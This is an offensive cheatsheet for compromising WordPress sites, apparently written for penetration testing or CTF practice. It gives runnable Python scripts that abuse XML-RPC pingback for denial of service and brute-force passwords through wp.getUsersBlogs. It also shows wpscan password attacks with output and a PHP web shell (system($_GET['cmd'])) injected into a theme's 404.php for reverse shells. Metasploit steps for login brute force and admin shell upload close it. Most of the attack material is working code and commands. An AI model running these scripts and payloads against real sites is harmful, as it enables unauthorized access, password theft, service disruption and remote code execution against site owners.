# Wordpress Cheatsheet

Tags :  #wordpress #wpscan #xmlrpc #systemlistmethods #wpgetusersblogs #metasploit #xmlrpcdos #themeinjection #plugininjection #wp-json #wp-admin #wp-content #wp-includes

A CMS is made up of two key components:

- A Content Management Application (CMA) - the interface used to add and manage content.
- A Content Delivery Application (CDA) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website

wordpress is CMS that means you can do little coding or no coding at all still u can build full fledged website including databases

---

## wordpress structure

├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php

---

## Login page

/wp-admin usually contains login page but it can be changed

```
/wp-admin/login.php
/wp-admin/wp-login.php
/login.php
/wp-login.php
```

---

## Enumerate Users Manually

first manually review posts posted by users and there you can see who posted the post 

another method is get request to /wp-json/wp/v2/users 

```
curl -X GET http://wordpresssite/wp-json/wp/v2/users
```

---

## XMLRPC Attacks

if wordpress have xmlrpc.php in the root directory we can execute rpc calls and can do ddos and bruteforce authentication

construct a post request to /xmlrpc.php
send this as data
```
<methodCall>

<methodName>system.listMethods</methodName>

<params>

</params>

</methodCall>
```

if you see all the methods in the response it means u can call those methods
else stop here and dont try to call any method its waste of time

one method is **pingback.ping**
this can be used to dos the machine
```
import requests
url = "http://127.0.0.1:8080/wordpress/xmlrpc.php"
xmldata = """
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://webhook.site/1b815e97-9911-484a-8ee8-0e75c608fea9/</string></value>
</param>
<param>
<value><string>http://127.0.0.1:8080/wordpress/</string></value>
</param>
</params>
</methodCall>
"""
r = requests.post(url,data=xmldata)
print(r.text)
```

first string is webhook , create a temporary one on online,second parameter is some random blog

Now we bruteforce username and password
we can also use **wp-admin** page but there may be limit to number of attempts
so in that case we can use xmlrpc.php
it doesnot have any limit 

```python
import requests
url = "http://127.0.0.1:8080/wordpress/xmlrpc.php"
passwords = ['tech69','admin']
for i in range(0,len(passwords)):
	xmldata = """
	<?xml version="1.0" encoding="UTF-8"?>
	<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
	<param>
	<value><string>admin</string></value>
	</param>
	<param>
	<value><string>{}</string></value>
	</param>
	</params>
	</methodCall>
	""".format(passwords[i])
	r = requests.post(url,data=xmldata)
	#print(r.text)
	if not "Incorrect" in r.text:
		print("username:password is admin:{}".format(passwords[i]))
```

correct response will be like this 
```
E:\python>python wordpress-xmlrpc.py
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://127.0.0.1:8080/wordpress/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Tech69</string></value></member>
  <member><name>xmlrpc</name><value><string>http://127.0.0.1:8080/wordpress/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

the above python code will give u password
tweak passwords from a file given and usernames also

---

## WPScan

**wpscan** enumerates wordpress themes , plugins , users , backups etc 

basic syntax
p - plugins
t - themes
u - users
```
wpscan --url http://192.168.0.102:8080/wordpress/ --enumerate p,t,u
```

we can also enumerate all plugins , all themes and for all users

```
wpscan --url http://192.168.0.102:8080/wordpress/ --enumerate ap,at,u
```

During the scan wpscan identifies vulnerabilities in the found themes/plugins 
it shows us the result if it have sqli or lfi or any other vulnerability 

we can also bruteforce users and passwords using wpscan with xmlrpc

```
wpscan --password-attack xmlrpc -U roger -P /rockyou.txt -t 25 --url http://138.68.141.81:31695
```

we get output if the password matches from rockyou.txt
```
[!] Valid Combinations Found:
 | Username: roger, Password: lizard
```

if bruteforcing for one user didnot work , try for another user even though that user is not admin 

---

## Theme/Plugin Injection

now we have access to wordpress dashboard
choose any theme 
and choose any php file like **404.php** or something which no one likely to use

now inject this php code 
```php
<?php system($_GET["cmd"]); ?>
```

click on update
if cms did give any errors like changes were reverted upload via sftp then edit another theme

now go to that php file in url 

```
http://192.168.0.102:8080/wordpress/wp-content/themes/twentysixteen/404.php?cmd=id
```

now put any reverse shell at **id** and get shells

---

## Metasploit 

metasploit has modules for xmlrpc and wordpress

```
search wordpress xmlrpc
```

```
Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  auxiliary/dos/http/wordpress_xmlrpc_dos           2014-08-06       normal     No     Wordpress XMLRPC DoS
   1  auxiliary/scanner/http/wordpress_ghost_scanner                     normal     No     WordPress XMLRPC GHOST Vulnerability Scanner
   2  auxiliary/scanner/http/wordpress_multicall_creds                   normal     No     Wordpress XML-RPC system.multicall Credential Collector
   3  auxiliary/scanner/http/wordpress_xmlrpc_login                      normal     No     Wordpress XML-RPC Username/Password Login Scanner
   4  exploit/unix/webapp/php_xmlrpc_eval               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```

lets try for bruteforcing login

```
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set RHOSTS 192.168.0.102
RHOSTS => 192.168.0.102
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set PASS_FILE /home/kali/tools/wordlists/rockyou.txt
PASS_FILE => /home/kali/tools/wordlists/rockyou.txt
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/wordpress_xmlrpc_login) > show options
```

run the module 

after getting the correct password we can upload shell using this module **exploit/unix/webapp/wp_admin_shell_upload**

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > setg RHOSTS 192.168.0.102
RHOSTS => 192.168.0.102
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RPORT 8080
RPORT => 8080
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin
PASSWORD => admin

run
```

now you get the reverse shell 


